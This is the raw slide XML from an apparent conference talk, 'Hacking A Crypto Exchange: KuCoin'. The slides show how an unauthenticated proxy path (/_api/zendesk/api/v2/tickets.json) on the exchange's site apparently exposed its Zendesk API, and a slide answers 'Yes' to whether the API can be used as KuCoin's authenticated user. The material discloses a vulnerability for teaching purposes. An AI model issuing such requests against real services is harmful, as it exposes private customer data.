              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>GET /_api/zendesk/api/v2/ HTTP/1.1</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Host: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>www.kucoin.com</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{"data": "&lt;!DOCTYPE html&gt;\n---SNIP---" }</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="510" name="Shape 510"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="511" name="Google Shape;511;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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2" name="Google Shape;512;p64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="513" name="Google Shape;513;p64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="514" name="Google Shape;514;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="515" name="Google Shape;515;p64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8398200" cy="33885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b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>I pulled up the API documentation and found the following:</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>"You must be a verified user to make API requests. You can authorize against the API using either basic authentication with your email address and password, with your email address and an API token, or with an OAuth access token."</a:t>
            </a:r>
            <a:endParaRPr b="1" i="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" i="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Can we just use the API as KuCoin's authenticated user?</a:t>
            </a:r>
            <a:endParaRPr b="1" i="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="519" name="Shape 519"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="520" name="Google Shape;520;p65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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1" name="Google Shape;521;p65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="522" name="Google Shape;522;p65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="523" name="Google Shape;523;p65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="524" name="Google Shape;524;p65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="2067750"/>
            <a:ext cx="8398200" cy="2167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b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>GET /_api/zendesk/api/v2/tickets.json HTTP/2</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Host: www.kucoin.com</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Connection: close</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="528" name="Shape 528"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="529" name="Google Shape;529;p66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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0" name="Google Shape;530;p66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="531" name="Google Shape;531;p66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="372900" y="-4271525"/>
            <a:ext cx="8398200" cy="5079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t/>
            </a:r>
            <a:endParaRPr b="1" sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="532" name="Google Shape;532;p66"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="452063" y="739600"/>
            <a:ext cx="8239876" cy="3897700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="533" name="Google Shape;533;p66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="452050" y="76375"/>
            <a:ext cx="4026600" cy="600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2700">
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Yes.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2700">
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="537" name="Shape 537"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="538" name="Google Shape;538;p67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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9" name="Google Shape;539;p67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="540" name="Google Shape;540;p67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="541" name="Google Shape;541;p67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
